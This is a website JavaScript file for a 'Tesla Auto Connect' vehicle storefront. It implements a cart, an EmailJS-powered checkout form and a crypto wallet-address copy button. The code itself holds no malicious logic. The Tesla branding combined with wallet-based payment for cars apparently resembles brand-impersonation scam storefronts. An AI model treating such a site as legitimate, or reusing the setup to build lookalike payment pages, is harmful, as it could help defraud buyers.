/* =========================================================
   TESLA AUTO CONNECT
   MAIN JAVASCRIPT
   ========================================================= */

"use strict";


/* =========================================================
   GLOBAL SETTINGS
   ========================================================= */

const EMAILJS_PUBLIC_KEY = "SMIll1sq8cBbCzskR";

const EMAILJS_SERVICE_ID = "service_hq3uofs";

const EMAILJS_TEMPLATE_ID = "template_ixlmcgg";


/* =========================================================
   EMAILJS INITIALIZATION
   ========================================================= */

document.addEventListener("DOMContentLoaded", function () {

  if (typeof emailjs !== "undefined") {

    emailjs.init({
      publicKey: EMAILJS_PUBLIC_KEY
    });

  }

});


/* =========================================================
   MOBILE NAVIGATION
   ========================================================= */

const menuToggle = document.getElementById("menuToggle");

const mainNav = document.getElementById("mainNav");


if (menuToggle && mainNav) {

  menuToggle.addEventListener("click", function () {

    mainNav.classList.toggle("active");

    menuToggle.classList.toggle("active");

    const expanded =
      menuToggle.classList.contains("active");

    menuToggle.setAttribute(
      "aria-expanded",
      expanded
    );

  });


  /* Close menu when a navigation link is clicked */

  const navLinks =
    mainNav.querySelectorAll("a");

  navLinks.forEach(function (link) {

    link.addEventListener("click", function () {

      mainNav.classList.remove("active");

      menuToggle.classList.remove("active");

      menuToggle.setAttribute(
        "aria-expanded",
        "false"
      );

    });

  });

}


/* =========================================================
   HEADER SCROLL EFFECT
   ========================================================= */

const siteHeader =
  document.getElementById("siteHeader");


function handleHeaderScroll() {

  if (!siteHeader) return;

  if (window.scrollY > 30) {

    siteHeader.classList.add("scrolled");

  } else {

    siteHeader.classList.remove("scrolled");

  }

}


window.addEventListener(
  "scroll",
  handleHeaderScroll,
  { passive: true }
);

handleHeaderScroll();


/* =========================================================
   REVEAL ANIMATIONS
   ========================================================= */

const revealElements =
  document.querySelectorAll(".reveal");


if ("IntersectionObserver" in window) {

  const revealObserver =
    new IntersectionObserver(
      function (entries, observer) {

        entries.forEach(function (entry) {

          if (entry.isIntersecting) {

            entry.target.classList.add("visible");

            observer.unobserve(
              entry.target
            );

          }

        });

      },
      {
        threshold: 0.12
      }
    );


  revealElements.forEach(function (element) {

    revealObserver.observe(element);

  });

} else {

  revealElements.forEach(function (element) {

    element.classList.add("visible");

  });

}


/* =========================================================
   SHOPPING CART
   ========================================================= */

let cart = [];


/* =========================================================
   ADD TO CART
   ========================================================= */

function addToCart(name, price) {

  const vehicle = {
    id: Date.now(),
    name: name,
    price: Number(price)
  };

  cart.push(vehicle);

  updateCart();

  showCartNotification(
    name
  );

}


/* =========================================================
   UPDATE CART
   ========================================================= */

function updateCart() {

  const cartItems =
    document.getElementById("cartItems");

  const total =
    document.getElementById("total");

  const cartCount =
    document.getElementById("cartCount");


  if (!cartItems || !total) return;


  /* Update cart count */

  if (cartCount) {

    cartCount.textContent =
      cart.length;

  }


  /* Empty cart */

  if (cart.length === 0) {

    cartItems.innerHTML = `

      <div class="empty-cart">

        <div class="empty-icon">
          🛒
        </div>

        <h3>
          Your cart is empty
        </h3>

        <p>
          Add a vehicle to get started.
        </p>

        <a
          href="#cars"
          class="btn btn-dark"
        >
          Browse Vehicles
        </a>

      </div>

    `;

    total.textContent = "$0";

    return;

  }


  let grandTotal = 0;


  let html = "";


  cart.forEach(function (item) {

    grandTotal += item.price;


    html += `

      <div class="cart-item">

        <div class="cart-item-info">

          <strong>
            ${escapeHTML(item.name)}
          </strong>

          <button
            class="remove-item"
            onclick="removeFromCart(${item.id})"
            type="button"
          >
            Remove
          </button>

        </div>

        <div class="cart-item-price">

          $${item.price.toLocaleString()}

        </div>

      </div>

    `;

  });


  cartItems.innerHTML = html;


  total.textContent =
    "$" + grandTotal.toLocaleString();


  updateCheckoutVehicle();

}


/* =========================================================
   REMOVE FROM CART
   ========================================================= */

function removeFromCart(id) {

  cart =
    cart.filter(function (item) {

      return item.id !== id;

    });


  updateCart();

}


/* =========================================================
   CLEAR CART
   ========================================================= */

function clearCart() {

  cart = [];

  updateCart();

}


/* =========================================================
   CART NOTIFICATION
   ========================================================= */

function showCartNotification(name) {

  let notification =
    document.getElementById(
      "cartNotification"
    );


  if (!notification) {

    notification =
      document.createElement("div");

    notification.id =
      "cartNotification";

    notification.className =
      "cart-notification";

    document.body.appendChild(
      notification
    );

  }


  notification.innerHTML = `

    <span class="notification-check">
      ✓
    </span>

    <span>
      ${escapeHTML(name)} added to cart
    </span>

  `;


  notification.classList.add(
    "show"
  );


  clearTimeout(
    window.cartNotificationTimer
  );


  window.cartNotificationTimer =
    setTimeout(function () {

      notification.classList.remove(
        "show"
      );

    }, 2500);

}


/* =========================================================
   UPDATE CHECKOUT VEHICLE
   ========================================================= */

function updateCheckoutVehicle() {

  const productSelect =
    document.querySelector(
      'select[name="product"]'
    );


  if (
    !productSelect ||
    cart.length === 0
  ) {
    return;
  }


  const latestVehicle =
    cart[cart.length - 1];


  const matchingOption =
    Array.from(
      productSelect.options
    ).find(function (option) {

      return option.value
        .toLowerCase()
        .includes(
          latestVehicle.name
            .replace("Used Tesla ", "")
            .replace("Tesla ", "")
            .toLowerCase()
        );

    });


  if (matchingOption) {

    productSelect.value =
      matchingOption.value;

  }

}


/* =========================================================
   SAFE HTML HELPER
   ========================================================= */

function escapeHTML(value) {

  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");

}


/* =========================================================
   CART INITIALIZATION
   ========================================================= */

document.addEventListener(
  "DOMContentLoaded",
  function () {

    updateCart();

  }
);/* =========================================================
   CHECKOUT FORM
   ========================================================= */

const paymentForm =
  document.getElementById("paymentForm");


if (paymentForm) {

  paymentForm.addEventListener(
    "submit",
    async function (event) {

      event.preventDefault();


      const submitButton =
        paymentForm.querySelector(
          'button[type="submit"]'
        );


      const successMessage =
        document.getElementById(
          "successMessage"
        );


      /* Prevent duplicate submissions */

      if (
        submitButton &&
        submitButton.disabled
      ) {
        return;
      }


      /* Check EmailJS */

      if (
        typeof emailjs === "undefined"
      ) {

        showFormError(
          "The email service could not be loaded. Please refresh the page and try again."
        );

        return;

      }


      /* Validate form */

      if (!paymentForm.checkValidity()) {

        paymentForm.reportValidity();

        return;

      }


      /* Save original button text */

      const originalButtonText =
        submitButton
          ? submitButton.innerHTML
          : "";


      /* Loading state */

      if (submitButton) {

        submitButton.disabled = true;

        submitButton.innerHTML = `
          <span class="button-spinner"></span>
          Sending Request...
        `;

      }


      try {

        await emailjs.sendForm(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          paymentForm
        );


        /* Successful submission */

        if (successMessage) {

          successMessage.style.display =
            "block";

          successMessage.innerHTML = `

            <h3>
              ✓ Request Received
            </h3>

            <p>
              Thank you. Your vehicle request
              has been submitted successfully.
            </p>

            <p>
              Our team will review your
              information and contact you
              regarding availability and
              next steps.
            </p>

          `;

        }


        /* Reset form */

        paymentForm.reset();


        /* Reset button */

        if (submitButton) {

          submitButton.disabled = false;

          submitButton.innerHTML =
            "✓ Request Submitted";

        }


        /* Scroll to success message */

        if (successMessage) {

          setTimeout(function () {

            successMessage.scrollIntoView({
              behavior: "smooth",
              block: "center"
            });

          }, 200);

        }


        /* Return button to normal */

        setTimeout(function () {

          if (submitButton) {

            submitButton.innerHTML =
              originalButtonText;

          }

        }, 4000);


      } catch (error) {

        console.error(
          "EmailJS Error:",
          error
        );


        showFormError(
          "We couldn't send your request right now. Please check your connection and try again."
        );


        if (submitButton) {

          submitButton.disabled =
            false;

          submitButton.innerHTML =
            originalButtonText;

        }

      }

    }
  );

}


/* =========================================================
   FORM ERROR MESSAGE
   ========================================================= */

function showFormError(message) {

  let errorBox =
    document.getElementById(
      "formError"
    );


  if (!errorBox) {

    errorBox =
      document.createElement("div");

    errorBox.id =
      "formError";

    errorBox.className =
      "form-error";

    if (paymentForm) {

      paymentForm.prepend(
        errorBox
      );

    }

  }


  errorBox.innerHTML = `
    <strong>Unable to submit</strong>
    <span>${escapeHTML(message)}</span>
  `;


  errorBox.style.display =
    "flex";


  errorBox.scrollIntoView({
    behavior: "smooth",
    block: "center"
  });

}


/* =========================================================
   WALLET COPY
   ========================================================= */

function copyWallet() {

  const walletInput =
    document.getElementById(
      "walletAddress"
    );


  if (!walletInput) {

    return;

  }


  const wallet =
    walletInput.value.trim();


  if (!wallet) {

    return;

  }


  /* Modern clipboard */

  if (
    navigator.clipboard &&
    window.isSecureContext
  ) {

    navigator.clipboard
      .writeText(wallet)
      .then(function () {

        showWalletCopied();

      })
      .catch(function () {

        fallbackCopyWallet(
          walletInput
        );

      });

  } else {

    fallbackCopyWallet(
      walletInput
    );

  }

}


/* =========================================================
   FALLBACK WALLET COPY
   ========================================================= */

function fallbackCopyWallet(
  walletInput
) {

  walletInput.focus();

  walletInput.select();

  walletInput.setSelectionRange(
    0,
    walletInput.value.length
  );


  try {

    const successful =
      document.execCommand(
        "copy"
      );


    if (successful) {

      showWalletCopied();

    } else {

      showFormError(
        "Copying was blocked by your browser. Please select the wallet address and copy it manually."
      );

    }

  } catch (error) {

    console.error(
      "Copy error:",
      error
    );

    showFormError(
      "Please copy the wallet address manually."
    );

  }

}


/* =========================================================
   WALLET COPIED MESSAGE
   ========================================================= */

function showWalletCopied() {

  let copied =
    document.getElementById(
      "copied"
    );


  if (!copied) {

    copied =
      document.createElement("div");

    copied.id =
      "copied";

    copied.className =
      "wallet-copied";

    const walletInput =
      document.getElementById(
        "walletAddress"
      );


    if (
      walletInput &&
      walletInput.parentElement
    ) {

      walletInput.parentElement
        .appendChild(copied);

    } else {

      document.body.appendChild(
        copied
      );

    }

  }


  copied.textContent =
    "✓ Wallet address copied";


  copied.classList.add(
    "show"
  );


  clearTimeout(
    window.walletCopiedTimer
  );


  window.walletCopiedTimer =
    setTimeout(function () {

      copied.classList.remove(
        "show"
      );

    }, 3000);

}


/* =========================================================
   SMOOTH ANCHOR SCROLLING
   ========================================================= */

document.addEventListener(
  "click",
  function (event) {

    const link =
      event.target.closest(
        'a[href^="#"]'
      );


    if (!link) return;


    const targetID =
      link.getAttribute("href");


    if (
      !targetID ||
      targetID === "#"
    ) {
      return;
    }


    const target =
      document.querySelector(
        targetID
      );


    if (!target) return;


    event.preventDefault();


    target.scrollIntoView({
      behavior: "smooth",
      block: "start"
    });

  }
);


/* =========================================================
   IMAGE ERROR HANDLING
   ========================================================= */

document.addEventListener(
  "DOMContentLoaded",
  function () {

    const images =
      document.querySelectorAll(
        "img"
      );


    images.forEach(function (image) {

      image.addEventListener(
        "error",
        function () {

          this.classList.add(
            "image-error"
          );


          /*
            Keeps the layout clean when
            an image file is missing.
          */

          this.alt =
            "Vehicle image unavailable";

        }
      );

    });

  }
);


/* =========================================================
   PREVENT DOUBLE CLICK ON BUTTONS
   ========================================================= */

document.addEventListener(
  "click",
  function (event) {

    const button =
      event.target.closest(
        "button"
      );


    if (!button) return;


    if (
      button.dataset.processing ===
      "true"
    ) {

      event.preventDefault();

      return;

    }

  }
);


/* =========================================================
   KEYBOARD ACCESSIBILITY
   ========================================================= */

document.addEventListener(
  "keydown",
  function (event) {

    if (
      event.key === "Escape"
    ) {

      if (mainNav) {

        mainNav.classList.remove(
          "active"
        );

      }

      if (menuToggle) {

        menuToggle.classList.remove(
          "active"
        );

        menuToggle.setAttribute(
          "aria-expanded",
          "false"
        );

      }

    }

  }
);


/* =========================================================
   PAGE LOAD
   ========================================================= */

window.addEventListener(
  "load",
  function () {

    document.body.classList.add(
      "page-loaded"
    );

  }
);/* =========================================================
   CART QUANTITY / CHECKOUT SYNC
   ========================================================= */

function getCartTotal() {

  return cart.reduce(
    function (total, item) {
      return total + Number(item.price);
    },
    0
  );

}


/* =========================================================
   CART ITEM COUNT
   ========================================================= */

function getCartCount() {

  return cart.length;

}


/* =========================================================
   CHECKOUT SUMMARY
   ========================================================= */

function updateCheckoutSummary() {

  const summary =
    document.getElementById(
      "checkoutSummary"
    );

  if (!summary) return;


  if (cart.length === 0) {

    summary.innerHTML = `
      <div class="checkout-summary-empty">
        No vehicle selected yet.
      </div>
    `;

    return;

  }


  let html = "";

  cart.forEach(function (item) {

    html += `
      <div class="checkout-summary-item">

        <span>
          ${escapeHTML(item.name)}
        </span>

        <strong>
          $${Number(item.price).toLocaleString()}
        </strong>

      </div>
    `;

  });


  html += `
    <div class="checkout-summary-total">

      <span>Total</span>

      <strong>
        $${getCartTotal().toLocaleString()}
      </strong>

    </div>
  `;


  summary.innerHTML = html;

}


/* =========================================================
   KEEP CHECKOUT SUMMARY UPDATED
   ========================================================= */

const originalUpdateCart =
  updateCart;


updateCart = function () {

  originalUpdateCart();

  updateCheckoutSummary();

};


/* =========================================================
   SAVE CART LOCALLY
   ========================================================= */

function saveCart() {

  try {

    localStorage.setItem(
      "teslaAutoConnectCart",
      JSON.stringify(cart)
    );

  } catch (error) {

    console.warn(
      "Cart could not be saved.",
      error
    );

  }

}


/* =========================================================
   LOAD SAVED CART
   ========================================================= */

function loadCart() {

  try {

    const savedCart =
      localStorage.getItem(
        "teslaAutoConnectCart"
      );


    if (!savedCart) {

      return;

    }


    const parsedCart =
      JSON.parse(savedCart);


    if (!Array.isArray(parsedCart)) {

      return;

    }


    cart = parsedCart
      .filter(function (item) {

        return (
          item &&
          typeof item.name === "string" &&
          Number.isFinite(
            Number(item.price)
          )
        );

      })
      .map(function (item) {

        return {

          id:
            item.id ||
            Date.now() +
            Math.random(),

          name: item.name,

          price: Number(item.price)

        };

      });


    updateCart();

  } catch (error) {

    console.warn(
      "Saved cart could not be loaded.",
      error
    );

    cart = [];

  }

}


/* =========================================================
   SAVE CART WHEN CHANGED
   ========================================================= */

const originalAddToCart =
  addToCart;


addToCart = function (
  name,
  price
) {

  originalAddToCart(
    name,
    price
  );

  saveCart();

};


const originalRemoveFromCart =
  removeFromCart;


removeFromCart = function (
  id
) {

  originalRemoveFromCart(id);

  saveCart();

};


const originalClearCart =
  clearCart;


clearCart = function () {

  originalClearCart();

  saveCart();

};


/* =========================================================
   LOAD CART AFTER PAGE LOAD
   ========================================================= */

document.addEventListener(
  "DOMContentLoaded",
  function () {

    loadCart();

    updateCheckoutSummary();

  }
);


/* =========================================================
   NAVIGATION CART COUNT ANIMATION
   ========================================================= */

function animateCartCount() {

  const cartCount =
    document.getElementById(
      "cartCount"
    );


  if (!cartCount) return;


  cartCount.classList.remove(
    "cart-count-pop"
  );


  void cartCount.offsetWidth;


  cartCount.classList.add(
    "cart-count-pop"
  );

}


/* =========================================================
   OBSERVE CART COUNT
   ========================================================= */

const cartCountElement =
  document.getElementById(
    "cartCount"
  );


if (cartCountElement) {

  const cartObserver =
    new MutationObserver(function () {

      animateCartCount();

    });


  cartObserver.observe(
    cartCountElement,
    {
      childList: true,
      characterData: true,
      subtree: true
    }
  );

}


/* =========================================================
   BACK TO TOP BUTTON
   ========================================================= */

function createBackToTop() {

  if (
    document.getElementById(
      "backToTop"
    )
  ) {

    return;

  }


  const button =
    document.createElement(
      "button"
    );


  button.id =
    "backToTop";

  button.className =
    "back-to-top";

  button.type =
    "button";

  button.setAttribute(
    "aria-label",
    "Back to top"
  );

  button.innerHTML =
    "↑";


  document.body.appendChild(
    button
  );


  button.addEventListener(
    "click",
    function () {

      window.scrollTo({
        top: 0,
        behavior: "smooth"
      });

    }
  );


  window.addEventListener(
    "scroll",
    function () {

      if (
        window.scrollY > 500
      ) {

        button.classList.add(
          "show"
        );

      } else {

        button.classList.remove(
          "show"
        );

      }

    },
    { passive: true }
  );

}


/* =========================================================
   INITIALIZE BACK TO TOP
   ========================================================= */

document.addEventListener(
  "DOMContentLoaded",
  function () {

    createBackToTop();

  }
);


/* =========================================================
   CURRENT YEAR
   ========================================================= */

function updateCopyrightYear() {

  const yearElements =
    document.querySelectorAll(
      "[data-current-year]"
    );


  const currentYear =
    new Date().getFullYear();


  yearElements.forEach(
    function (element) {

      element.textContent =
        currentYear;

    }
  );

}


document.addEventListener(
  "DOMContentLoaded",
  updateCopyrightYear
);


/* =========================================================
   FORM FIELD AUTO-FORMATTING
   ========================================================= */

const phoneInputs =
  document.querySelectorAll(
    'input[type="tel"]'
  );


phoneInputs.forEach(
  function (input) {

    input.addEventListener(
      "input",
      function () {

        this.value =
          this.value.replace(
            /[^\d+\-()\s]/g,
            ""
          );

      }
    );

  }
);


/* =========================================================
   PREVENT FORM SUBMISSION WHILE OFFLINE
   ========================================================= */

window.addEventListener(
  "offline",
  function () {

    showFormError(
      "You appear to be offline. Please reconnect to the internet before submitting your request."
    );

  }
);


/* =========================================================
   ONLINE STATUS
   ========================================================= */

window.addEventListener(
  "online",
  function () {

    const errorBox =
      document.getElementById(
        "formError"
      );


    if (errorBox) {

      errorBox.style.display =
        "none";

    }

  }
);


/* =========================================================
   FINAL INITIALIZATION
   ========================================================= */

document.addEventListener(
  "DOMContentLoaded",
  function () {

    updateCart();

    updateCheckoutSummary();

    handleHeaderScroll();

  }
);


/* =========================================================
   TESLA AUTO CONNECT
   SCRIPT COMPLETE
   ========================================================= */